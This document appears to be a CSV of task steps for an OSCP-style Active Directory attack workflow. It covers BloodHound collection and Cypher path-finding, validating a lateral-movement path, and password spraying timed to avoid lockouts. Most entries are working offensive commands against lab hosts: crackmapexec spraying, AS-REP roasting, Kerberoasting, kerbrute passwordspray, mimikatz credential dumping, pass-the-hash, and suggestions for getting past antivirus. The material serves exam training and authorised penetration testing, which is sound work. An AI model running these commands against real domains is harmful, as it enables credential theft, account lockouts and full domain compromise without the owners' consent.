"id","name","objective","description","expected_output","notes"
"authenticate-domain","Authenticate to Domain with Valid Credentials","Establish authenticated domain user session required for LDAP queries and data collection","REQUIREMENT: Valid domain user credentials.
ANY domain user can run BloodHound - no special privileges required. Even low-privilege standard user accounts can enumerate complete domain structure via LDAP queries.

AUTHENTICATION METHODS:

LINUX (bloodhound-python):
Credentials provided via command line:
bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All --zip

Password prompted interactively OR provided inline.
Alternative: Use NTLM hash with -hashes flag OR Kerberos ticket with -k flag.

WINDOWS (SharpHound.exe):
Use current user session (if domain-joined) OR runas /netonly /user:<DOMAIN>\<USERNAME> cmd.exe to inject credentials.
SharpHound.exe automatically uses current session context - no credential parameters needed.

VERIFICATION:

Linux: bloodhound-python -u pete -p 'Nexus123!' -d corp.com -ns 192.168.223.70 -c All --zip
Expected: 'Resolved Collection Methods: ...' (authentication successful)
Failure: 'Could not connect to LDAP' OR 'Authentication failed' (check credentials/DC IP)

Windows: whoami /groups (should show domain groups like 'DOMAIN USERS')

TIME SYNC CRITICAL:
Kerberos authentication requires time sync within 5 minutes of DC.
Fix clock skew: sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>
Verify: date (check time matches DC time closely)
Error without sync: KRB_AP_ERR_SKEW (Clock skew too great)

COMMON FAILURES:

1. STATUS_LOGON_FAILURE:
Cause: Invalid credentials, wrong domain, or account locked.
Solution: Verify credentials with crackmapexec smb <DC_IP> -u <USER> -p '<PASS>' -d <DOMAIN>

2. Connection timeout:
Cause: DC unreachable or LDAP port blocked.
Solution: Test connectivity: nc -zv <DC_IP> 389 (LDAP) AND nc -zv <DC_IP> 636 (LDAPS)

3. KDC_ERR_C_PRINCIPAL_UNKNOWN:
Cause: Wrong username or domain name.
Solution: Check domain name: nslookup <DC_IP> (should return domain FQDN)

OSCP TIP: Test authentication BEFORE starting BloodHound collection to avoid wasting time. 30 seconds validation saves 5 minutes troubleshooting failed collection.

TIME ESTIMATE: 1-2 minutes (includes time sync and verification).","",""
"collect-bloodhound-data","Collect BloodHound Data with All Collection Methods","Execute BloodHound data collection to enumerate users, computers, groups, sessions, trusts, and ACLs","COLLECTION METHODS:

bloodhound-python (Linux - RECOMMENDED for OSCP):
bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All --zip

Flags explained:
-c All: Collect ALL data (users, groups, computers, sessions, trusts, ACLs, containers)
--zip: Automatically create ZIP file for easy upload (bh.zip)
-ns <DC_IP>: Specify DNS server (use DC IP for reliable resolution)

Output:
[*] Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, ObjectProps, Container
[*] Connecting to LDAP server: dc01.corp.com
[+] Done in 00M 45S
[*] Compressing output into bh.zip

Result: bh.zip file created (500KB-5MB depending on domain size)
Contains: users.json, computers.json, groups.json, sessions.json, trusts.json, acls.json, containers.json

SharpHound.exe (Windows - if RDP/WinRM access):
SharpHound.exe -c All --zipfilename bh.zip

Advantages over bloodhound-python:
- Collects local admin sessions (bloodhound-python uses LDAP only, misses some sessions)
- Faster for large domains (native C# vs Python)

Disadvantages:
- Requires Windows code execution (may trigger AV)
- Requires file transfer to Kali for analysis

COLLECTION SCOPES:

-c All: COMPLETE collection (recommended - only 5 extra seconds vs partial)
-c Session: ONLY user sessions (fast but incomplete)
-c DCOnly: Domain Controller data only (excludes workstation sessions - NOT recommended)

CRITICAL FOR OSCP: ALWAYS use -c All. Session data is CRITICAL for finding Domain Admin credentials cached on workstations (the service session pattern from writeup). DCOnly collection MISSES this goldmine.

TROUBLESHOOTING:

1. 'Could not resolve domain':
Cause: DNS resolution failing.
Solution: Use -ns flag with DC IP: -ns 192.168.223.70

2. 'No session data collected':
Cause: bloodhound-python limitation (LDAP-based, doesn't enumerate all sessions).
Solution: Use SharpHound.exe if Windows access available OR accept reduced session data.
Alternative: Manual session enumeration: crackmapexec smb <SUBNET> -u <USER> -p '<PASS>' --sessions

3. Collection hangs:
Cause: Large domain (1000+ users) or network latency.
Solution: Wait (can take 5-10 minutes for very large domains) OR use --dns-tcp flag for stability.

4. Partial data (empty users.json):
Cause: Insufficient LDAP permissions OR wrong base DN.
Solution: Verify authentication successful, try --dns-tcp, check LDAP not blocked.

DATA VERIFICATION:

unzip -l bh.zip
Expected files:
users.json (100KB-1MB)
computers.json (50KB-500KB)
groups.json (50KB-200KB)
sessions.json (10KB-100KB)
trusts.json (small, <10KB)
acls.json (large, 1MB-10MB)

Quick check:
jq '.data | length' users.json
Expected: 10+ users (small domain) to 1000+ users (large domain)
If 0: Collection failed, troubleshoot authentication/LDAP access.

OSCP EXAM SCENARIO: Small domain (10-50 users, 5-20 computers). Collection completes in 30-90 seconds. Output file <1MB.

TIME ESTIMATE: 30 seconds - 2 minutes (OSCP typical), up to 10 minutes (large corporate domains).","",""
"upload-to-bloodhound","Upload Data to BloodHound GUI and Verify Ingestion","Import collected JSON data into Neo4j database via BloodHound GUI for graph analysis","PREREQUISITE: Neo4j running and BloodHound GUI launched.

Start Neo4j:
sudo neo4j start
Verify: sudo neo4j status (should show 'active (running)')
Default credentials: neo4j:neo4j (change on first login)

Start BloodHound GUI:
bloodhound
Login: neo4j / <your_password>
Expected: BloodHound interface opens with 'Upload Data' button.

UPLOAD PROCESS:

1. Click 'Upload Data' button (top-right, database icon with up arrow)
2. Select bh.zip file OR drag-and-drop ZIP file into window
3. Ingestion begins automatically

Ingestion Output:
[*] Processing users.json
[+] Imported 25 users
[*] Processing computers.json
[+] Imported 8 computers
[*] Processing groups.json
[+] Imported 12 groups
[*] Processing sessions.json
[+] Imported 45 sessions
[*] Processing trusts.json
[+] Imported 0 trusts (no domain trusts in small domains - normal)
[*] Processing acls.json
[+] Imported 1250 ACL relationships

Expected completion: 10-30 seconds for OSCP-sized domain.

VERIFICATION:

Database Info (bottom-left icon):
- Users: 25 (should match 'jq '.data | length' users.json')
- Computers: 8
- Groups: 12
- Sessions: 45
- ACLs: 1250
- Relationships: ~1500-2000 total

If counts are 0: Upload failed, data not ingested.

Search bar test:
Type a known username (e.g., 'pete' from enumeration).
Expected: User node appears, click to view properties.
Properties show: name, domain, enabled, description, password last set, etc.

CRITICAL: CLEAR OLD DATA BEFORE NEW UPLOADS

Problem: Previous lab domains still in database cause confusion.
Symptom: Queries return results from WRONG domain.

Solution:
Database Info → Clear Database → Confirm
Waits 5-10 seconds for deletion.
Verify: All counts show 0.
Then upload new domain data.

OSCP EXAM TIP: Clear database at START of each AD target. Prevents cross-contamination between exam machines.

TROUBLESHOOTING:

1. 'Could not connect to Neo4j':
Cause: Neo4j not running OR wrong credentials.
Solution: sudo neo4j status, verify running. Reset password if needed: sudo neo4j-admin set-initial-password <newpass>

2. Upload hangs or fails:
Cause: Large JSON files (>10MB) OR corrupted ZIP.
Solution: Extract ZIP, upload individual JSON files: Upload Data → select users.json, then computers.json, etc.
Alternative: Increase Neo4j heap memory in /etc/neo4j/neo4j.conf: dbms.memory.heap.max_size=2G

3. Zero nodes imported:
Cause: Empty JSON files (collection failed in step 2).
Solution: Return to step 2, troubleshoot collection, re-collect data.

4. Partial import (users imported but no sessions):
Cause: sessions.json empty (bloodhound-python limitation) OR excluded from collection.
Solution: Re-collect with -c All flag. If still empty, accept reduced session data (common with bloodhound-python).

MANUAL VERIFICATION QUERIES:

Database Info → Raw Query (bottom icon, </> symbol)

Test query 1 (count users):
MATCH (u:User) RETURN count(u)
Expected: Same count as Database Info

Test query 2 (list users):
MATCH (u:User) RETURN u.name LIMIT 10
Expected: User list appears (pete@corp.com, mike@corp.com, etc.)

Test query 3 (check sessions):
MATCH (c:Computer)<-[:HasSession]-(u:User) RETURN c.name, u.name LIMIT 10
Expected: Computer-user session pairs.
If empty: No sessions imported (bloodhound-python limitation OR -c Session not used).

TIME ESTIMATE: 30 seconds - 2 minutes (upload + verification).","",""
"analyze-prebuilt-queries","Run Pre-Built Queries to Find Privilege Escalation Paths","Execute BloodHound's built-in queries to identify shortest paths to Domain Admins from compromised users","PRE-BUILT QUERY WORKFLOW:

BloodHound provides ~40 pre-built queries organized by attack category.
Access: Three horizontal lines icon (top-left) → Analysis

CRITICAL FIRST STEP: Mark compromised users as 'Owned'.

Search bar → type compromised username (e.g., 'pete').
Right-click user node → 'Mark User as Owned' (node turns red skull icon).
Repeat for ALL compromised accounts (pete, mike, dave, etc.).

WHY: 'Owned Principals' queries ONLY work if users marked as owned.

PRIMARY QUERY: Shortest Paths to Domain Admins from Owned Principals

Location: Analysis → Domain → 'Shortest Paths to Domain Admins from Owned Principals'

Expected behavior:

SUCCESS SCENARIO (uncommon for standard users):
Graph displays: owned_user → [relationship chain] → Domain Admins group
Relationship examples:
- pete → MemberOf → IT Admins → AdminTo → DC01 → Domain Admins
- mike → GenericAll → sql_service → MemberOf → Domain Admins

FAILURE SCENARIO (COMMON - this is NORMAL):
'No Data Returned'
OR
Graph shows owned user node with NO connections to Domain Admins.

CRITICAL OSCP LESSON: This does NOT mean no path exists!

From Corp-DCSync writeup:
pete@corp.com marked as owned.
Query: 'Shortest Paths to Domain Admins from Owned Principals'
Result: NO DATA RETURNED

Interpretation: pete has no DIRECT privilege escalation path.
pete is standard domain user with no AdminTo, GenericAll, or other exploitable permissions to privileged accounts.

SOLUTION: Proceed to step 5 (custom Cypher queries) to find INDIRECT paths.

ALTERNATIVE PRE-BUILT QUERIES (try these if primary fails):

1. Find Workstations where Domain Users can RDP:
Analysis → Domain → 'Find Workstations where Domain Users can RDP'
Looks for: (Domain Users group) → CanRDP → (Computer)
Use case: If compromised user can RDP to workstation, gain interactive access for credential dumping.

2. Find Computers where Domain Users are Local Admin:
Analysis → Domain → 'Find Computers where Domain Users are Local Admin'
Looks for: (Domain Users group) → AdminTo → (Computer)
Use case: If compromised user has local admin, can use PSExec/WinRM for SYSTEM shell.

3. Shortest Paths to High Value Targets:
Analysis → Pathfinding → 'Shortest Paths to High Value Targets'
Select: Start node = owned user, End node = Domain Admins
Looks for: ANY relationship chain, not just 'shortest'.
May reveal longer paths missed by 'Shortest Paths' query.

4. Find Principals with DCSync Rights:
Analysis → Domain → 'Find Principals with DCSync Rights'
Looks for: Users/groups with DS-Replication-Get-Changes permissions.
Use case: If owned user has DCSync rights (rare), instant domain compromise.

QUERY INTERPRETATION:

EDGE TYPES (relationship types between nodes):

- AdminTo: Local administrator on computer (CAN: PSExec, WinRM, WMI for SYSTEM shell)
- MemberOf: Group membership (CAN: Inherit group privileges)
- HasSession: User logged into computer (CAN: Credential harvest with mimikatz if you're local admin)
- GenericAll: Full control over object (CAN: Change password, add to groups, modify ACLs)
- WriteDACL: Write ACL permissions (CAN: Grant yourself GenericAll)
- WriteOwner: Change object owner (CAN: Make yourself owner, then WriteDACL, then GenericAll)
- AllExtendedRights: All extended rights (CAN: Force-ChangePassword, Read LAPS password)
- ForceChangePassword: Reset user password (CAN: Change password, authenticate as user)

ATTACK PATH EXAMPLES:

Example 1 (Direct):
pete → AdminTo → FILE01 → HasSession → maria (Domain Admin)
Attack: PSExec to FILE01 as pete → mimikatz dumps maria's credentials → Pass-the-Hash as Domain Admin.

Example 2 (Indirect):
pete → MemberOf → Help Desk → ForceChangePassword → sql_service → MemberOf → Domain Admins
Attack: Reset sql_service password (Help Desk privilege) → Authenticate as sql_service → Domain Admin access.

Example 3 (ACL Abuse):
pete → WriteDACL → IT_Admin group → MemberOf → Domain Admins
Attack: Grant GenericAll to IT_Admin group → Add pete to IT_Admin → Domain Admin via group membership.

TIME BUDGET: 5 minutes MAXIMUM for pre-built queries.

If no clear path after 5 minutes → Proceed to custom Cypher queries (step 5).
Don't waste time clicking through every pre-built query - most won't apply to your scenario.

TIME ESTIMATE: 2-5 minutes (mark owned, run queries, interpret results).","",""
"custom-cypher-queries","Execute Custom Cypher Queries to Find Hidden Attack Paths","Use custom Cypher queries to discover privilege escalation paths missed by pre-built queries","WHEN TO USE CUSTOM QUERIES:

Pre-built query returned 'No Data' (step 4 failed).
Owned user is standard domain user with no direct privilege escalation path.

CRITICAL PATTERN from writeup:
pete@corp.com: Pre-built query found NO path.
Custom query revealed: mike@corp.com (another standard user) has AdminTo → CLIENT75.
Second query: CLIENT75 has HasSession → maria@corp.com (Domain Admin).
ATTACK PATH: pete → enumerate users → mike credentials → lateral movement to CLIENT75 → mimikatz dumps maria → Domain Admin.

This path is INVISIBLE to 'Shortest Paths' query because pete doesn't have the AdminTo relationship - mike does.

CUSTOM CYPHER QUERY ACCESS:

BloodHound GUI: Bottom-left icon (</> symbol) → 'Raw Query'
OR
Search bar: Type advanced Cypher syntax directly.

QUERY 1: Find systems where compromised user has local admin

MATCH (u:User {name:'PETE@CORP.COM'})-[:AdminTo]->(c:Computer)
RETURN u,c

Replace 'PETE@CORP.COM' with your owned username (UPPERCASE, include @DOMAIN.COM).

Expected results:
SUCCESS: Graph shows pete → AdminTo → [list of computers]
Example: pete → AdminTo → WORKSTATION01, WORKSTATION02
Action: Can PSExec/WinRM to these systems for SYSTEM shell.

NO RESULTS: pete has no local admin rights on any systems.
Action: Try Query 2 (test other compromised users).

QUERY 2: Find systems where ANOTHER user has local admin

MATCH (u:User {name:'MIKE@CORP.COM'})-[:AdminTo]->(c:Computer)
RETURN u,c

Replace 'MIKE' with other domain users found during enumeration (dave, jeff, stephanie, etc.).

Corp-DCSync example:
Query for mike: FOUND → mike → AdminTo → CLIENT75.CORP.COM
This is the BREAKTHROUGH - mike has access even though pete doesn't.

Action: Obtain mike's credentials (password spray, AS-REP roasting, Kerberoasting) → lateral movement to CLIENT75.

QUERY 3: Find Domain Admin sessions on discovered computers

MATCH (c:Computer {name:'CLIENT75.CORP.COM'})<-[:HasSession]-(u:User)
RETURN c,u

Replace 'CLIENT75.CORP.COM' with computer from Query 2.

Expected results:
SUCCESS: Graph shows CLIENT75 ← HasSession ← [list of users]
Example: CLIENT75 ← HasSession ← maria@CORP.COM, dave@CORP.COM

Check user properties:
Click maria node → Properties → memberOf: 'DOMAIN ADMINS@CORP.COM'

CRITICAL DISCOVERY: Domain Admin has session on workstation!
Session type in properties: 'Session: Service from 0' (service account - persists until reboot).

Action: Lateral movement to CLIENT75 with mike credentials → mimikatz dumps maria's Domain Admin credentials → escalate to Domain Admin.

QUERY 4: Find ALL sessions on a computer (broader search)

MATCH (c:Computer {name:'CLIENT75.CORP.COM'})<-[:HasSession]-(u:User)
RETURN c.name, u.name, u.description

Returns: Computer name, username, user description (shows group memberships).
Useful for: Identifying non-admin high-value users (SQL admins, backup operators, etc.).

QUERY 5: Find privilege escalation through group membership

MATCH (u:User {name:'PETE@CORP.COM'})-[:MemberOf*1..3]->(g:Group {name:'DOMAIN ADMINS@CORP.COM'})
RETURN p

*1..3 = traverse 1 to 3 group memberships.
Example path: pete → MemberOf → IT Admins → MemberOf → Server Operators → MemberOf → Domain Admins

Likely result: NO PATH (standard users not in privileged groups).
But worth checking - may find nested group memberships missed by pre-built queries.

QUERY 6: Find computers where Domain Users group has RDP or admin access

MATCH (g:Group {name:'DOMAIN USERS@CORP.COM'})-[:CanRDP|AdminTo]->(c:Computer)
RETURN g,c

|CanRDP|AdminTo| = match EITHER relationship type.
Useful: If Domain Users group over-privileged (common misconfiguration).

QUERY 7: Find users with DCSync rights

MATCH (u:User)-[:GetChanges|GetChangesAll]->(d:Domain)
RETURN u.name

Finds: Users with DS-Replication-Get-Changes permissions (can perform DCSync).
Rare for standard users, but if found = instant domain compromise.

QUERY ITERATION STRATEGY:

1. Query owned user (pete) for AdminTo → If NONE, go to step 2.
2. Query OTHER users (mike, dave, jeff, etc.) for AdminTo → Find systems with admin access.
3. Query discovered systems for HasSession → Find high-value users (Domain Admins).
4. Verify exploitable path: Can you obtain credentials for user with AdminTo? Can you access system with HasSession?
5. Document attack chain: owned_user → intermediate_user credentials → lateral movement → credential harvest → privilege escalation.

MANUAL JSON PARSING ALTERNATIVE (if BloodHound GUI unavailable):

jq '.data[] | select(.Properties.name==""PETE@CORP.COM"") | .Aces' users.json
Shows: ACL permissions for pete (GenericAll, WriteDACL, etc.).

jq '.data[] | select(.Properties.serviceprincipalnames != null) | .Properties.name' users.json
Shows: Users with SPNs (Kerberoasting targets).

jq '.data[] | select(.Properties.dontreqpreauth == true) | .Properties.name' users.json
Shows: Users with pre-auth disabled (AS-REP roasting targets).

TROUBLESHOOTING:

1. Query returns syntax error:
Cause: Wrong Cypher syntax OR wrong node/relationship name.
Solution: Copy query EXACTLY from examples, replace only username/computer name. Node names case-sensitive: User not user.

2. Query returns no results:
Cause: User/computer name wrong OR relationship doesn't exist.
Solution: Verify name with search bar first. Check spelling and domain (PETE@CORP.COM not PETE).

3. Don't understand graph results:
Cause: Need to learn edge types.
Solution: Click relationship edge → Properties shows relationship type. Read BloodHound edge documentation.

4. Too many results:
Cause: Query too broad.
Solution: Add LIMIT clause: MATCH ... RETURN ... LIMIT 10

OSCP EXAM STRATEGY:

Test top 5 users from enumeration (most common usernames: admin, administrator, user, backup, service).
Test top 5 computers (DCs, file servers, SQL servers most likely to have admin sessions).
Don't spend >10 minutes on custom queries - if no path found, proceed with credential attacks (Kerberoasting, AS-REP roasting, password spray).

TIME ESTIMATE: 5-10 minutes (iterate through 5-10 custom queries).","",""
"validate-attack-path","Validate Discovered Attack Path is Exploitable","Verify the BloodHound-discovered attack path is feasible and systems are accessible","VALIDATION CHECKLIST:

From Corp-DCSync example, discovered path:
mike@CORP.COM → AdminTo → CLIENT75.CORP.COM → HasSession → maria@CORP.COM (Domain Admin)

Validation steps:

1. VERIFY SYSTEM ACCESSIBLE:

Ping test:
ping -c 3 192.168.223.75
Expected: Reply from 192.168.223.75
Failure: Request timeout (system offline or firewall blocking ICMP).

Port scan:
sudo nmap -p 445,5985,5986 -Pn 192.168.223.75
Expected:
445/tcp open (SMB - for PSExec)
5985/tcp open (WinRM - for Evil-WinRM)
OR 5986/tcp open (WinRM HTTPS)

Failure: Ports filtered (firewall blocking lateral movement protocols).
Alternative: Try RDP (3389), WMI (135), or DCOM (varies).

2. VERIFY USER CREDENTIALS OBTAINABLE:

From BloodHound: Need mike@CORP.COM credentials for CLIENT75 access.

Check if credentials already known:
grep -i 'mike' /path/to/credentials.txt

If NOT known, plan credential acquisition:

Option A: Password spray (if password policy allows):
crackmapexec smb 192.168.223.70 -u mike -p password_list.txt -d corp.com
Risk: Account lockout if threshold exceeded.

Option B: AS-REP roasting (if mike has pre-auth disabled):
impacket-GetNPUsers corp.com/mike -no-pass -dc-ip 192.168.223.70
Success: Returns AS-REP hash for offline cracking.

Option C: Kerberoasting (if mike has SPN):
impacket-GetUserSPNs corp.com/pete:Nexus123! -request | grep mike
Success: Returns TGS hash for offline cracking.

Option D: Credential reuse from other compromises:
Test known passwords: crackmapexec smb 192.168.223.70 -u mike -p 'Nexus123!' (try pete's password).

Corp-DCSync result: mike's password = Darkness1099! (obtained via password spray).

3. VERIFY ADMIN ACCESS TO SYSTEM:

Test credentials:
crackmapexec smb 192.168.223.75 -u mike -p 'Darkness1099!' -d corp.com

Expected output:
[+] 192.168.223.75:445 CLIENT75 [+] corp.com\mike:Darkness1099! (Pwn3d!)
       ^^^^^^^^ (Pwn3d!) indicator = local admin access CONFIRMED.

Failure outputs:
[+] corp.com\mike:Darkness1099! (no Pwn3d): Valid credentials but NOT local admin.
Solution: BloodHound data wrong OR permissions changed. Find alternative system.

[-] STATUS_LOGON_FAILURE: Invalid credentials.
Solution: Password wrong OR account locked. Re-verify credentials.

4. VERIFY SESSION EXISTS (optional but recommended):

From Kali:
crackmapexec smb 192.168.223.75 -u mike -p 'Darkness1099!' -d corp.com --sessions

Expected output:
corp.com\maria (Domain Admin session present)

Failure: No sessions OR maria logged off.
Solution: Session data may be stale (BloodHound collection was hours/days ago). User may have logged off.
Alternative: Proceed with credential dump anyway - cached credentials persist even after logoff.

From Windows (if RDP/WinRM access):
quser
OR
query user

Shows: Currently logged-on users (interactive sessions only, doesn't show service sessions).

5. VERIFY MIMIKATZ CAN RUN (if AV present):

Test on compromised system first (if you have another Windows access):
.\mimikatz.exe ""exit""

Expected: Mimikatz banner, then exits.
Failure: File deleted immediately (Windows Defender detected and quarantined).
Solution: Use alternative (Invoke-Mimikatz PowerShell in-memory, procdump + pypykatz, disable Defender).

PATH VALIDATION DECISION TREE:

System accessible + Credentials obtainable + Admin access confirmed = PROCEED TO EXPLOITATION (proceed to attack)

System accessible + Credentials obtainable + Admin access DENIED = BloodHound data wrong, find alternative path

System accessible + Credentials NOT obtainable = Plan credential acquisition (password spray, AS-REP/Kerberoast, credential reuse)

System NOT accessible = System offline or firewalled, find alternative path

DOCUMENTATION:

Create attack plan file:
echo ""ATTACK PATH VALIDATION"" > attack_plan.txt
echo """" >> attack_plan.txt
echo ""Target: CLIENT75.CORP.COM (192.168.223.75)"" >> attack_plan.txt
echo ""Access: mike@CORP.COM (Darkness1099!) - LOCAL ADMIN"" >> attack_plan.txt
echo ""Objective: Dump maria@CORP.COM (Domain Admin) credentials from LSASS"" >> attack_plan.txt
echo ""Method: Evil-WinRM → Upload Mimikatz → privilege::debug → sekurlsa::logonpasswords"" >> attack_plan.txt
echo ""Expected: maria NTLM hash → Pass-the-Hash to DC → Domain Admin access"" >> attack_plan.txt

OSCP EXAM TIP: Validation prevents wasting time on dead-end attack paths. 5 minutes validation saves 30 minutes failed exploitation attempts.

TIME ESTIMATE: 3-5 minutes (connectivity checks, credential verification, admin access confirmation).","",""
"discover-policy-detailed","Discover and Document Password Policy in Detail","Retrieve complete password policy and document all lockout-related settings for calculation","Use appropriate method based on position: net-accounts-policy (Windows), crackmapexec-policy (Linux+creds), enum4linux-policy (Linux+null session), or ldapsearch-policy (LDAP). DOCUMENT THESE VALUES: (1) Lockout threshold (e.g., 5). (2) Lockout observation window (e.g., 30 minutes). (3) Lockout duration (e.g., 30 minutes). (4) Minimum password length (helps craft password list). (5) Password complexity (helps understand requirements). CREATE SPRAY LOG: Set up tracking spreadsheet or file with columns: Username, Password1_Time, Password2_Time, Password3_Time, Total_Attempts, Status. This log prevents accidental re-spraying of users who've already received max attempts.","",""
"calculate-safe-limits","Calculate Conservative Safe Spray Limits","Determine maximum safe attempts per user with safety margin to prevent lockouts","CONSERVATIVE CALCULATION (Ultra-Safe): Safe attempts = Lockout threshold - 2. Example: threshold 5 → spray 3 passwords max (not 4). This provides TWO layers of safety: (1) -1 for user's own failed login attempts. (2) -1 for timing uncertainty and network delays. OBSERVATION WINDOW BUFFER: Add 5 minutes to observation window for safety. Example: 30min window → wait 35min between spray rounds. Why? Clock skew between attacker and DC, network delays, ensure counter fully resets. TOTAL PASSWORD LIMIT: Calculate how many passwords you can safely test in available time. Formula: max_passwords = (available_time_minutes - spray_time) / (observation_window + buffer). Example: 3 hour exam window, 30min observation window → max 5 passwords total (5 × 35min = 175min = 2h55m). DOCUMENT: Write these values in spray log header for reference.","",""
"prepare-username-list","Enumerate and Prepare Username List","Build validated username list and pre-populate spray log","Enumerate valid usernames using kerbrute-userenum-ad (fastest, most reliable). Save results to users.txt. SPRAY LOG SETUP: Add each validated username to spray log with empty timestamp columns. This creates accountability for each spray round. OPTIONAL FILTERING: Consider filtering list: (1) Exclude administrator and krbtgt (high-value, closely monitored). (2) Exclude service accounts if identifiable (often have complex passwords). (3) Focus on standard user accounts. (4) Prioritize accounts with description fields suggesting human users (not computers/services). REASONING: Fewer targets = faster spray rounds = more passwords testable in time budget. For exam: 20-50 users is manageable, 200+ users takes too long with safe timing.","",""
"spray-round-1","Spray Round 1 - First Password Attempt","Test first common password against all users with full logging","SELECT PASSWORD: Choose most common default password. Examples: Password123!, Welcome2023!, CompanyName2023! (replace CompanyName with actual org name from OSINT). EXECUTE SPRAY: Use kerbrute passwordspray (fastest, stealthiest). COMMAND: kerbrute passwordspray -d domain.com --dc DC_IP users.txt 'Password123!'. LOG RESULTS: Immediately update spray log: (1) Add timestamp in Password1_Time column for all users. (2) Mark successful authentications with username:password in Status column. (3) Increment Total_Attempts counter for each user. (4) Note any errors or anomalies. SET TIMER: Start countdown timer for (observation_window + buffer) minutes. Example: 30min window + 5min buffer = 35 minute timer. DO NOT spray again until timer expires.","",""
